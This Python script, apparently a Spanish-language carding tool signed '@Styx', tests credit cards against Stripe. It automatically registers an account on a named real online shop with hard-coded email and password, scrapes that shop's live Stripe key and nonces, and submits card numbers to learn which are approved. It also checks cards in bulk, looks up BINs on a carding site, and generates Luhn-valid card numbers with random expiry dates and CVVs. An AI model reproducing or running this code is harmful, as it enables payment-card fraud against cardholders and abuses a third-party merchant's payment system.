import requests
import random
import re
import time
import logging
from typing import List, Optional, Tuple
from datetime import datetime
from getuseragent import UserAgent
import user_agent

logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s")
logger = logging.getLogger(__name__)

CARD_TYPES = {
    "visa": {"prefixes": ["4"], "length": 16, "cvv_length": 3},
    "mastercard": {"prefixes": ["51", "52", "53", "54", "55"], "length": 16, "cvv_length": 3},
    "amex": {"prefixes": ["34", "37"], "length": 15, "cvv_length": 4},
    "discover": {"prefixes": ["6011", "644", "645", "646", "647", "648", "649", "65"], "length": 16, "cvv_length": 3},
}

def brn6(ccx):
    if isinstance(ccx, list):
        ccx = "|".join(ccx)
    ccx = ccx.strip()
    try:
        n, mm, yy, cvc = ccx.split("|")
        if "20" in yy:
            yy = yy.split("20")[1]
    except ValueError:
        return "Error: Formato inválido. Usa CC|MM|YYYY|CVV"

    user = user_agent.generate_user_agent()
    r = requests.session()

    tienda = "https://shop.wiseacrebrew.com/account/"

    try:
        headers = {
            'authority': 'shop.wiseacrebrew.com',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
            'accept-language': 'en-US,en;q=0.9',
            'cache-control': 'max-age=0',
            'referer': tienda,
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': user,
        }

        response = r.get(tienda, headers=headers)
        register = re.search(r'name="woocommerce-register-nonce" value="(.*?)"', response.text).group(1)

        headers['content-type'] = 'application/x-www-form-urlencoded'
        headers['origin'] = 'https://shop.wiseacrebrew.com'

        data = {
            'email': 'Jorge.t.teme@gmail.com',
            'password': 'Tomasteme2009',
            'woocommerce-register-nonce': register,
            '_wp_http_referer': '/account/',
            'register': 'Register',
        }

        r.post(tienda, headers=headers, data=data)
        response = r.get('https://shop.wiseacrebrew.com/account/payment-methods/', headers=headers)

        nonce = re.search(r'"createAndConfirmSetupIntentNonce":"(.*?)"', response.text).group(1)

        key_search = re.search(r'"key":"(pk_live_[^"]+)"', response.text)
        if not key_search:
            key_search = re.search(r'key=pk_live_[a-zA-Z0-9]+', response.text)
            if key_search:
                key = key_search.group(0).split('=')[1]
            else:
                return ' No pude extraer la clave pública de Stripe'
        else:
            key = key_search.group(1)

        headers = {
            'authority': 'api.stripe.com',
            'accept': 'application/json',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'referer': 'https://js.stripe.com/',
            'user-agent': user,
        }

        stripe_data = f"type=card&card[number]={n}&card[cvc]={cvc}&card[exp_year]={yy}&card[exp_month]={mm}&key={key}"
        response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=stripe_data)
        resp_json = response.json()

        if 'error' in resp_json:
            error_message = resp_json['error'].get('message', 'Declined sin mensaje')
            return f'Declined: {error_message}'

        tok = resp_json['id']

        headers = {
            'authority': 'shop.wiseacrebrew.com',
            'accept': '*/*',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'origin': 'https://shop.wiseacrebrew.com',
            'referer': 'https://shop.wiseacrebrew.com/account/add-payment-method/',
            'user-agent': user,
            'x-requested-with': 'XMLHttpRequest',
        }

        params = {'wc-ajax': 'wc_stripe_create_and_confirm_setup_intent'}
        confirm_data = {
            'action': 'create_and_confirm_setup_intent',
            'wc-stripe-payment-method': tok,
            'wc-stripe-payment-type': 'card',
            '_ajax_nonce': nonce,
        }

        response = r.post('https://shop.wiseacrebrew.com/', params=params, headers=headers, data=confirm_data)

        if 'succeeded' in response.text:
            return 'Approved'
        elif 'authentication_required' in response.text or 'requires_action' in response.text:
            return '3D Secure required'
        else:
            error_match = re.search(r'"message":"(.*?)"', response.text)
            if error_match:
                return f'Declined: {error_match.group(1)}'
            return 'Declined: Unknown error'

    except Exception as e:
        return f'Error inesperado: {str(e)}'

def public_bin_gate(ccx: str) -> str:
    try:
        if isinstance(ccx, list):
            ccx = "|".join(str(x) for x in ccx)
        ccx = ccx.strip()

        parts = ccx.split("|")
        if len(parts) != 4:
            return "Declined: Formato inválido. Usa CC|MM|YYYY|CVV"

        n, mm, yy, cvc = parts

        if len(yy) == 4 and yy.startswith("20"):
            yy = yy[2:]
        elif len(yy) != 2:
            return "Declined: Año inválido. Usa YY o YYYY"

        if not all([
            n.isdigit() and 13 <= len(n) <= 19,
            mm.isdigit() and 1 <= int(mm) <= 12,
            yy.isdigit() and 0 <= int(yy) <= 99,
            cvc.isdigit() and 3 <= len(cvc) <= 4
        ]):
            return "Declined: Formato de datos inválido"

        current_year = int(datetime.now().strftime("%y"))
        current_month = int(datetime.now().strftime("%m"))
        if int(yy) < current_year or (int(yy) == current_year and int(mm) < current_month):
            return "Declined: Tarjeta expirada"

        def luhn_check(card_number: str) -> bool:
            digits = [int(d) for d in card_number]
            checksum = 0
            is_even = False
            for digit in digits[::-1]:
                if is_even:
                    digit *= 2
                    if digit > 9:
                        digit -= 9
                checksum += digit
                is_even = not is_even
            return checksum % 10 == 0

        if not luhn_check(n):
            return "Declined: Número de tarjeta inválido (falló verificación Luhn)"

        bin_number = n[:6]
        ua = UserAgent().random
        headers = {
            'User-Agent': ua,
            'Accept': 'application/json'
        }

        try:
            response = requests.get(
                f"https://lookup.binlist.net/{bin_number}",
                headers=headers,
                timeout=5
            )
            if response.status_code != 200:
                return "Declined: No se pudo verificar el BIN de la tarjeta"

            bin_data = response.json()
            card_type = bin_data.get('type', 'unknown')
            brand = bin_data.get('brand', 'unknown43')
            bank = bin_data.get('bank', {}).get('name', 'unknown')
            country = bin_data.get('country', {}).get('name', 'unknown')

            if card_type.lower() not in ['credit', 'debit']:
                return f"Declined: Tipo de tarjeta no soportado ({card_type})"

            if brand.lower() in ['visa', 'mastercard', 'amex', 'discover']:
                return f"Approved: {brand} - {bank} - {country}"
            else:
                return f"Declined: Marca de tarjeta no soportada ({brand})"

        except requests.exceptions.RequestException:
            return "Declined: Error al consultar información del BIN"

    except Exception as e:
        return f"Error inesperado: {str(e)}"

def luhn_checksum(card_number: str) -> int:
    def digits_of(n: str) -> List[int]:
        return [int(d) for d in str(n) if d.isdigit()]
    digits = digits_of(card_number)
    odd_digits = digits[-1::-2]
    even_digits = digits[-2::-2]
    checksum = sum(odd_digits)
    for d in even_digits:
        checksum += sum(digits_of(d * 2))
    return checksum % 10

def luhn_complete(bin_base: str, card_length: int = 16) -> Optional[str]:
    number = bin_base
    while len(number) < card_length - 1:
        number += str(random.randint(0, 9))
    for i in range(10):
        trial = number + str(i)
        if luhn_checksum(trial) == 0:
            return trial
    logger.warning(f"checkeo no valido for BIN: {bin_base}")
    return None

def validate_bin(bin_input: str, card_type: str = None) -> Tuple[bool, str, str]:
    bin_clean = re.sub(r"[^0-9xX]", "", bin_input)
    if len(bin_clean.replace("x", "").replace("X", "")) < 6:
        return False, "BIN must have at least 6 digits.", ""
    if card_type:
        card_info = CARD_TYPES.get(card_type.lower())
        if not card_info:
            return False, f"Unsupported card type: {card_type}", ""
        if not any(bin_clean.startswith(prefix) for prefix in card_info["prefixes"]):
            return False, f"BIN does not match {card_type} prefixes.", ""
        return True, "", card_type.lower()
    for c_type, info in CARD_TYPES.items():
        if any(bin_clean.startswith(prefix) for prefix in info["prefixes"]):
            return True, "", c_type
    return False, "BIN does not match any supported card type.", ""

def generate_card(bin_input: str, card_type: str = None, expiry_years: range = range(2025, 2040)) -> Optional[dict]:
    is_valid, error, detected_type = validate_bin(bin_input, card_type)
    if not is_valid:
        logger.error(f"Invalid BIN: {error}")
        return None
    card_info = CARD_TYPES[detected_type]
    card_number = luhn_complete(bin_input.replace("x", "").replace("X", ""), card_info["length"])
    if not card_number:
        return None
    month = f"{random.randint(1, 12):02}"
    year = f"20{random.randint(expiry_years.start % 100, expiry_years.stop % 100 - 1):02}"
    cvv = "".join(str(random.randint(0, 9)) for _ in range(card_info["cvv_length"]))
    return {
        "card_number": card_number,
        "expiry": f"{month}/{year}",
        "cvv": cvv,
        "card_type": detected_type.capitalize()
    }

def format_card(card: dict, format_style: str = "plain") -> str:
    if format_style == "detailed":
        return (f"Card Type: {card['card_type']}\n"
                f"Number: {card['card_number']}\n"
                f"Expiry: {card['expiry']}\n"
                f"CVV: {card['cvv']}")
    mm, yyyy = card['expiry'].split('/')
    return f"{card['card_number']}|{mm}|{yyyy}|{card['cvv']}"

def check_single_card():
    gate = 'Stripe Auth'
    print("Verificando tarjeta...")
    cc = input("Ingresa la tarjeta: ").strip()
    if not cc:
        print("Error! Debes ingresar una tarjeta.")
        return

    start_time = time.time()
    cc_list = cc.split("|")
    bin_number = cc_list[0][:6]
    cc_str = "|".join(cc_list)

    last = brn6(cc_str)

    try:
        bin_data = requests.get(f'https://bins.antipublic.cc/bins/{bin_number}').json()
    except:
        bin_data = {}
        last = 'Error'

    brand = bin_data.get('brand', 'Unknown')
    card_type = bin_data.get('type', 'Unknown')
    country = bin_data.get('country_name', 'Unknown')
    country_flag = bin_data.get('country_flag', '🏳️')
    bank = bin_data.get('bank', 'Unknown')

    end_time = time.time()
    execution_time = end_time - start_time

    status = "✅ Approved" if last == 'Approved' else "❌ Declined"
    msg = f"""
{status} (Single Check)
[↯] CC: {cc}
[↯] GATE: {gate}
[↯] RESPONSE: {last}
[↯] BIN: {bin_number} - {card_type} - {brand}
[↯] Bank: {bank}
[↯] Country: {country} {country_flag}
[↯] Time Taken: {execution_time:.1f} seconds
Bot By: @Styx
"""
    print(msg)

def check_multiple_cards():
    gate = 'Multi Stripe'
    print("Verificando tarjetas múltiples...")
    print("Ingresa las tarjetas: ")
    lines = []
    while True:
        line = input()
        if line == "":
            break
        lines.append(line.strip())
    cards = [line for line in lines if line]

    if not cards:
        print(" No se encontraron tarjetas válidas!")
        return

    for index, cc in enumerate(cards, 1):
        start_time = time.time()
        result = brn6(cc)
        bin_number = cc.split("|")[0][:6]

        try:
            bin_data = requests.get(f'https://bins.antipublic.cc/bins/{bin_number}').json()
        except:
            bin_data = {}

        brand = bin_data.get('brand', 'Unknown')
        card_type = bin_data.get('type', 'Unknown')
        country = bin_data.get('country_name', 'Unknown')
        country_flag = bin_data.get('country_flag', '🏳️')
        bank = bin_data.get('bank', 'Unknown')

        status = "✅ Approved" if result == 'Approved' else "❌ Declined"
        msg = f"""
[{index}] {status}
CC: {cc}
RESPONSE: {result}
BIN: {bin_number} - {card_type} - {brand}
Bank: {bank}
Country: {country} {country_flag}
"""
        print(msg)

def check_bin_test():
    gate_name = "BIN Public"
    print("Verificando tarjetas...")
    print("Ingresa las tarjetas (una por línea, formato CC|MM|YYYY|CVV). Presiona Enter dos veces para terminar:")
    lines = []
    while True:
        line = input()
        if line == "":
            break
        lines.append(line.strip())
    cards = [line for line in lines if line]

    if not cards:
        print("NO hay cards validas!!")
        return

    for index, cc in enumerate(cards, 1):
        start_time = time.time()
        result = public_bin_gate(cc)
        elapsed = time.time() - start_time

        bin_number = cc.split("|")[0][:6] if "|" in cc else cc[:6]
        try:
            ua = UserAgent().random
            headers = {'User-Agent': ua, 'Accept': 'application/json'}
            bin_response = requests.get(f'https://bins.antipublic.cc/bins/{bin_number}', headers=headers, timeout=5)
            bin_data = bin_response.json() if bin_response.status_code == 200 else {}
        except requests.RequestException as e:
            bin_data = {}
            logger.error(f"Faladooo!!!!! for {bin_number}: {str(e)}")

        brand = bin_data.get('brand', 'Unknown') or 'Unknown'
        card_type = bin_data.get('type', 'Unknown') or 'Unknown'
        country = bin_data.get('country_name', 'Unknown') or 'Unknown'
        country_flag = bin_data.get('country_flag', '🏳️') or '🏳️'
        bank = bin_data.get('bank', 'Unknown') or 'Unknown'

        status = "✅ Approved" if result.startswith('Approved') else "❌ Declined"
        msg = f"""
[{index}] {status} (Publico BIN)
CC: {cc}
GATE: {gate_name}
RESPONSE: {result}
BIN: {bin_number} | {card_type.upper()} | {brand.upper()}
BANK: {bank.upper()}
COUNTRY: {country.upper()} {country_flag}
TIME: {elapsed:.1f} seconds
"""
        print(msg)

def generate_cards():
    try:
        print("GenTm Uso: <BIN> [-c <count>] [-t <type>]")
        print("Ejemplo: 416916xxxxxxxxx -c 10 -t visa")
        command = input("Ingresa: ").strip()
        parts = command.split()
        if not parts:
            print("Uso: <BIN> [-c <count>] [-t <type>]")
            return

        bin_input = parts[0].strip()
        count = 10
        card_type = None

        i = 1
        while i < len(parts):
            if parts[i] == "-c" and i + 1 < len(parts):
                count = min(int(parts[i + 1]), 100)
                i += 2
            elif parts[i] == "-t" and i + 1 < len(parts):
                card_type = parts[i + 1]
                i += 2
            else:
                i += 1

        if count <= 0:
            print("positive number!")
            return

        cards = []
        for _ in range(count):
            card = generate_card(bin_input, card_type)
            if card:
                mm, yyyy = card['expiry'].split('/')
                formatted_card = f"{card['card_number']}|{mm}|{yyyy}|{card['cvv']}"
                cards.append(formatted_card)
            else:
                print(f"Fallo generando cards for BIN: {bin_input}")
                return

        print("\nGenerated Cards:")
        print("\n".join(cards))
        logger.info(f"Generado! {len(cards)} cards")

    except ValueError as e:
        print(f"Invalido!!!: {str(e)}")
        logger.error(f"Error: {str(e)}")
    except Exception as e:
        print(f"Error: {str(e)}")
        logger.error(f"error: {str(e)}", exc_info=True)

def run(args):
    while True:
        print("""
1 > Checker unico
2 > Check Multiple
3 > Generate Cards By Tm
4 > Volver
        """)
        opcion = input('digite su eleccion: ')
        if opcion == "1":
            check_single_card()
        elif opcion == "2":
            check_multiple_cards()
        elif opcion == "3":
            generate_cards()
        elif opcion == "4":
            break
        else:
            print("opcion no dispo!")

if __name__ == "__main__":
    print(" Checker iniciado!")
    run([])
